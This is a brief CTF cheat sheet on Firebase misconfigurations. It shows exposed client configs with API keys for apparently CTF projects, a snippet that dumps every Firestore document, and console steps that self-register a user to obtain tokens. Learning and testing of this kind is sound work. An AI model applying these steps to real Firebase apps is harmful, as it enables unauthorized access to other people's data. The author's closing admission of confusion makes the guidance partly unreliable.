# Firebase Exploits

## Credentials Given to Access Firebase/Firestorage Service

Eg. the below code left exposed:

```js
const firebaseConfig = {
  apiKey: 'AIzaSyDN_2EZMN-1QCJ4V13WYUTV4UKA4Im8lLM',
  authDomain: 'websec-ctfs.firebaseapp.com',
  projectId: 'websec-ctfs',
  storageBucket: 'websec-ctfs.appspot.com',
  messagingSenderId: '617149347368',
  appId: '1:617149347368:web:e34a2bf5fe52fb1b77a71d'
}
```

In this case, we can simply download the files and run/host it ourselves, adding our own code to dump all the firestorage documents.

```js
const colRef = collection(db, `${collectionName}`);
const docsSnap = await getDocs(colRef);
docsSnap.forEach(doc => {
  console.log(JSON.stringify(doc.data()));
})
```

Another case:

```js
firebase.initializeApp({
  "apiKey": "AIzaSyDmLIX31LAFvb1hefXs-e6Baspcfg6ran8",
  "authDomain": "udctf-fire.firebaseapp.com",
  "databaseURL": "https://udctf-fire-default-rtdb.firebaseio.com",
  "messagingSenderId": "272888152617",
  "projectId": "udctf-fire",
  "storageBucket": "udctf-fire.appspot.com"
});
```

We can paste this into console, prepending `app =` to save the instance.

Following that:

```js
app.auth().createUserWithEmailAndPassword('email@example.com','Abc123!')
```

Then, run `app.auth()` and `ctrl+f` the UID, access token etc. Use the API either `/oracle` or check the [documentation](https://firebase.google.com/docs/reference/rest/database). Honestly idk what is going on Firebase is weird.